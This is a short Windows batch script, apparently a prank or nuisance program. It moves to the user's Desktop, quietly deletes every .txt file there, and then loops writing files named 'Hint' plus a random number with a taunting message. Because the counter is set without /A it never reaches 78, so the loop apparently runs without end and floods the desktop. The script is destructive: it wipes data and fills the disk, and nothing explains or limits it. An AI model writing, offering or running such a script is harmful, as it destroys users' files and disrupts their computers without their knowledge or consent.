@echo off
if not exist "%userprofile%\Onedrive" (cd %userprofile%\Desktop) else (cd %userprofile%\Onedrive\Desktop)
del *.txt/q
set /A a=0
:b
if %a% == 78 goto e
echo Think that, if cmd has disabled use powershell, right? > "Hint %random%.txt"
set a=%a%+1
goto b
:e